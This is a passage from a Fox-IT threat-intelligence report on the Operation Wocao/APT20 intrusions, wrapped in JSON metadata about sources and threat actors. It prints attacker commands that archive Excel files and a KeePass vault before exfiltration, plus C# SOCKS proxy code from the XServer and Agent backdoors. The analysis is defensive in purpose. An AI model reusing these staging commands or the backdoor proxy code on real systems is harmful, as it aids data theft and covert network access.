Channel**\nThe XServer backdoor is capable of downloading arbitrary files from the victim system. In several\nof Fox-IT’s investigations this was the primary method for data exfiltration.\n\n**6.10.2 Data Compressed**\nOn multiple occasions, we’ve observed the actor using legitimate tools such as WinRAR to bundle\nmultiple files or makecab to compress a large file. In the examples below za.exe and zoo.exe are in\nfact renamed WinRAR binaries.\n\n```\n/c cd /d c:\\windows\\temp\\ & makecab zww.txt zww.a\n/c cd /d c:\\windows\\temp\\ & za.exe a za.a -r c:\\users\\<username>\\desktop\\*.xlsx\n/c cd /d c:\\windows\\temp & zoo.exe a zoo.a -r G:\\Keepass\\\n\n```\n\nAdditionally, the XServer backdoor protocol uses DEFLATE to compress most of its communication.\n\n#### 6.11 Command and Control\n\n**6.11.1 Connection Proxy**\nThe custom tooling deployed by this actor is capable of proxying traffic using a protocol very similar\nto SOCKS5. In observed cases, the actor employed this proxying functionality to move laterally\nwithin a victim’s network. Often the custom XServer backdoor would be deployed on a server\nwith a long uptime, which would then act as an initial proxy hop into the victim network. Through\nthis proxy, traffic would be routed towards other systems in the network.\n\n\n-----\n\n**6.11.2 Custom Command and Control Protocol**\nA custom protocol is used for command and control communication. In the case of XServer, this\nprotocol is capable of proxying traffic (optionally using multiple hops) and starting a backdoor session\nprotected by TLS.\n\nOSINT resulted in some public source code (hereafter referred to as \"ProxyTest\"), found on a\nChinese blog¹⁵, which shows a significant amount of similarities with the XServer and agent\nbackdoor. The ProxyTest code provides (authenticated) SOCKS proxy functionality. XServer and\nagent provide the same functionality and the code used to achieve this shows a significant amount\nof similarities, both in the implementation of actual functionality as well as in the coding style such\nas variable and function naming. Some of the functionality similarities are highlighted in the table.\n\n|XServer|Agent|ProxyTest|\n|---|---|---|\n|CliSock.Send(new byte[] { 0x05, 0x00 });|No overlap|CliSock.Send(new byte[] { 0x05, 0x00 });|\n|try { Len = CliSock.Receive(RecvBuf); byte CMD = RecvBuf[1]; byte ATYP = RecvBuf[3]; if (CMD == 0x01) { if (ATYP == 0x01) { byte[] Addr = new byte[4]; Buffer.BlockCopy(RecvBuf, 4, Addr, 0, 4); String sip = \"\"; foreach (byte b in Addr) { sip += b.ToString() + \".\"; } IPAddress[] ips = Dns.GetHostAddresses(sip.Remove(sip.Length - 1)); ip = ips[0]; Port = 256 * RecvBuf[8] + RecvBuf[9]; } else if (ATYP == 0x03) { byte AddrLen = RecvBuf[4]; byte[] Addr = new byte[AddrLen]; Buffer.BlockCopy(RecvBuf, 5, Addr, 0, AddrLen); String HostName = System.Text.Encoding.Default.GetString(Addr); IPAddress[] ips = Dns.GetHostAddresses(HostName); ip = ips[0]; Port = 256 * RecvBuf[AddrLen + 5] + RecvBuf[AddrLen + 6]; } else { reply_error(CliSock); return; } } } catch { reply_error(CliSock); return; } try { CliSock.Send(reply); TransArgs targ = new TransArgs(); targ.sockClient = CliSock; targ.ip = ip; targ.port = Port; TransmitData(targ); }|try { sslsock.Read(buf, 0, 4); byte CMD = buf[1]; byte ATYP = buf[3]; if (CMD == 0x01) { if (ATYP == 0x01) { sslsock.Read(buf, 0, 6); byte[] Addr = new byte[4]; Buffer.BlockCopy(buf, 4, Addr, 0, 4); String sip = \"\"; foreach (byte b in Addr) { sip += b.ToString() + \".\"; } IPAddress[] ips = Dns.GetHostAddresses(sip.Remove(sip.Length - 1)); ip = ips[0]; Port = 256 * buf[4] + buf[5]; } else if(ATYP == 0x03) { sslsock.Read(buf, 0, 1); byte AddrLen = buf[0]; sslsock.Read(buf, 0, AddrLen + 2); byte[] Addr = new byte[AddrLen]; Buffer.BlockCopy(buf, 0, Addr, 0, AddrLen); String HostName = System.Text.Encoding.Default.GetString(Addr); IPAddress[] ips = Dns.GetHostAddresses(HostName); ip = ips[0]; Port = 256 * buf[AddrLen] + buf[AddrLen + 1]; } else { reply_error(sslsock); return; } } else { reply_error(sslsock); return; } } catch { reply_error(sslsock); return; } try { Socket ServerSock = new Socket(AddressFamily.InterNetwork, SocketType. Stream, ProtocolType.Tcp); ServerSock.Connect(ip, Port); sslsock.Write(reply); StartTransData(CliSock, ServerSock, 2, sslsock); } catch { reply_error(sslsock); return; }|try { Len = CliSock.Receive(RecvBuf); byte CMD = RecvBuf[1]; byte ATYP = RecvBuf[3]; if (CMD == 0x01) { if (ATYP == 0x01) { if (RecvBuf.ToString().Split('.').Length == 5) { byte AddrLen = RecvBuf[4]; byte[] Addr = new byte[AddrLen]; Buffer.BlockCopy(RecvBuf, 5, Addr, 0, AddrLen); IPAddress[] ips = Dns.GetHostAddresses(Addr.ToString()); ip = ips[0]; Port = 256 * RecvBuf[AddrLen + 5] + RecvBuf[AddrLen + 6]; } else { byte[] Addr = new byte[4]; Buffer.BlockCopy(RecvBuf, 4, Addr, 0, 4); String sip = \"\"; foreach (byte b in Addr) { sip += b.ToString() + \".\"; } IPAddress[] ips = Dns.GetHostAddresses(sip.Remove(sip. Length - 1)); ip = ips[0]; Port = 256 * RecvBuf[9] + RecvBuf[10]; } } else if (ATYP == 0x03) { byte AddrLen = RecvBuf[4]; byte[] Addr = new byte[AddrLen]; Buffer.BlockCopy(RecvBuf, 5, Addr, 0, AddrLen); String HostName = System.Text.Encoding.Default.GetString(Addr); IPAddress[] ips = Dns.GetHostAddresses(HostName); ip = ips[0]; Port = 256 * RecvBuf[AddrLen + 5] + RecvBuf[AddrLen + 6]; } else { return; } CliSock.Send(new byte[] { 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }); } } catch { return; } try { ServerSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); ServerSock.Connect(ip, Port); StartTransData(CliSock, ServerSock); } catch { CliSock.Shutdown(SocketShutdown.Both); CliSock.Close(); return; }|\n\n\n-----\n\n|No overlap|while (bRunning) { try { if (clisock.Poll(1000, SelectMode.SelectRead)) { Array.Clear(recv_c_buf, 0, recv_c_buf.Length); if (type == 0) Len = clisock.Receive(recv_c_buf); else Len = sslstr.Read(recv_c_buf, 0, recv_c_buf.Length); if (Len == 0) { break; } else { srvsock.Send(recv_c_buf, 0, Len, 0); } } if (srvsock.Poll(1000, SelectMode.SelectRead)) { Array.Clear(recv_s_buf, 0, recv_s_buf.Length); Len = srvsock.Receive(recv_s_buf); if (Len == 0) { break; } else { if (type == 0) clisock.Send(recv_s_buf, 0, Len, 0); else { sslstr.Write(recv_s_buf, 0, Len); } } } } catch { break; } }|while (IsRun) { try { if (clisock.Poll(1000, SelectMode.SelectRead)) { Len = clisock.Receive(RecvBuf); if (Len == 0) { clisock.Shutdown(SocketShutdown.Both); clisock.Close(); sersock.Shutdown(SocketShutdown.Both); sersock.Close(); break; } else { Len = sersock.Send(RecvBuf, 0, Len, 0); Console.WriteLine(\"【\" + SockNum.ToString() + \"】\" + SrcHost + \"==>\" + DstHost + \"[发送\" + Len.ToString() + \"字节]\"); } } if (sersock.Poll(1000, SelectMode.SelectRead)) { Len = sersock.Receive(RecvBuf); if (Len == 0) { sersock.Shutdown(SocketShutdown.Both); sersock.Close(); clisock.Shutdown(SocketShutdown.Both); clisock.Close(); break; } else { Len = clisock.Send(RecvBuf, 0, Len, 0); Console.WriteLine(\"【\" + SockNum.ToString() + \"】\" + DstHost + \" ==> \" + SrcHost + \" [接收\" + Len.ToString() + \"字节]\"); } } } catch { break; } }|\n|---|---|---|\n\n\n**6.11.3 Multi-hop Proxy**\nBoth the XServer and Agent backdoors contain a partial implementation of a SOCKS5 proxy with\nsome additional functionality. The additional functionality allows traffic to be routed over multiple\nhops, where each hop must be running the same type of backdoor. When hops are utilized, all hops\nto be used are included in the “handshake” packet. The receiving client takes one hop from the list,\nconnects to the hop and transmits the remainder of the hops.\n\nCommands executed through the webshell were occasionally executed via Tor exit nodes.\n\n15. https://blog.csdn.net/ts__cf/article/details/47659829\n\n\n-----\n\n**6.11.4 Standard Cryptographic Protocol**\nXServer\nThe XServer backdoor utilizes TLS for its backdoor functionality. When the magic packet for starting\na backdoor session is received, the socket is upgraded to a TLS socket. Even though the backdoor\nis technically the server in the connection, it will act like a TLS client. The backdoor will use “Root”\nas the SNI and the connecting client (TLS server) will reply with a certificate that has “Root” as\ncommon name.\n\nAgent\nThe agent backdoor/proxy uses TLS in a similar way, but for the proxy functionality. It contains a\nsimilar multi-hop functionality as the XServer backdoor, but the final hop in the agent proxy will\nupgrade the socket to a TLS socket in the same way as XServer does. Underneath the TLS, the final\nhop still behaves like a regular SOCKS5 proxy. The TLS in this case makes sure that the traffic is\nencrypted across all hops, whereas it is plaintext with XServer.\n\nThe multi-hop functionality also differs slightly. In the agent variant, the individual hop IP addresses\nare encrypted using RC4, whereas they are plain in the XServer variant. Port numbers are still in plain,\nhowever.\n\n**6.11.5 Uncommonly Used Port**\nThe actor uses uncommon high ports for its XServer backdoor. Over time, Fox-IT has observed the\nactor using port 47000 in early stages of an attack, but switch to 25667 in later stages. It is unclear\nwhy the actor choses these specific ports or why they are changed.\n\n\n-----\n\n**Fox-IT**\nFox-IT prevents, solves and mitigates the most\nserious threats caused by cyber attacks, data\nleaks or fraud with innovative solutions for\ngovernments, defense agencies, law enforcement,\ncritical infrastructures and banking and commercial\nenterprise clients worldwide. The Fox-IT Red Team\nservice is part of NCC Group’s Full Spectrum Attack\nServices. Fox-IT combines smart ideas with advanced\ntechnology to create solutions that contribute to\na more secure society. We develop products and\ncustom solutions for our clients to guarantee the\nsafety of sensitive and critical (government) systems,\nto protect industrial networks, to defend online\nbanking systems and to secure confidential data.\n\n\n**Fox-IT B.V.**\n\nOlof Palmestraat 6, Delft\n\nP.O. Box 638, 2600 AP Delft\n\nThe Netherlands\n\n\nT +31 (0)15 284 7999\n\nF +31 (0)15 284 7990\n\nfox@fox-it.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.12.19.Operation_Wocao/201912_Report_Operation_Wacao.pdf"
    ],
    "report_names": [
        "201912_report_operation_wocao.pdf",
        "201912_Report_Operation_Wacao"
    ],
    "threat_actors": [
        {
            "id": "5d512e7c-f6a7-47b5-b440-4968c299deaf",
            "created_at": "2023-01-06T13:46:38.344772Z",
            "updated_at": "2025-03-27T02:00:02.810045Z",
            "deleted_at": null,
            "main_name": "APT20",
            "aliases": [
                "VIOLIN PANDA",
                "TH3Bug",
                "Crawling Taurus"
            ],
            "source_name": "MISPGALAXY:APT20",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b7cb83fe-4412-40b3-8757-ace5107599b6",
            "created_at": "2023-01-06T13:46:39.08347Z",
            "updated_at": "2025-03-27T02:00:02.992739Z",
            "deleted_at": null,
            "main_name": "Operation Wocao",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Wocao",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dd583696-3de6-4c23-bfb6-e675a38a7000",
            "created_at": "2022-10-25T16:07:23.338398Z",
            "updated_at": "2025-03-27T02:02:09.744409Z",
            "deleted_at": null,
            "main_name": "APT 20",
            "aliases": [
                "APT 20",
                "APT 8",
                "Crawling Taurus",
                "Operation Wocao",
                "TH3Bug",
                "Violin Panda"
            ],
            "source_name": "ETDA:APT 20",
            "tools": [
                "Agent.dhwf",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Filesnfer",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "KeeThief",
                "Kerberoast",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PlugX",
                "Poison Ivy",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SMBExec",
                "SPIVY",
                "SharpHound",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "WinRAR",
                "XServer",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4b48d9e2-ef19-44fb-938b-30a9078d9e49",
            "created_at": "2022-10-25T15:50:23.314139Z",
            "updated_at": "2025-03-27T02:00:55.439029Z",
            "deleted_at": null,
            "main_name": "Operation Wocao",
            "aliases": [
                "Operation Wocao"
            ],
            "source_name": "MITRE:Operation Wocao",
            "tools": [
                "netstat",
                "dsquery",
                "Mimikatz",
                "PowerSploit",
                "Impacket"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041709,
    "ts_creation_date": 1576684712,
    "ts_modification_date": 1576684715,
    "files": {
        "pdf": "https://archive.orkl.eu/85ddad10bbd8e93e8de1bfedee6563ce5f0c6f96.pdf",
        "text": "https://archive.orkl.eu/85ddad10bbd8e93e8de1bfedee6563ce5f0c6f96.txt",
        "img": "https://archive.orkl.eu/85ddad10bbd8e93e8de1bfedee6563ce5f0c6f96.jpg"
    }
}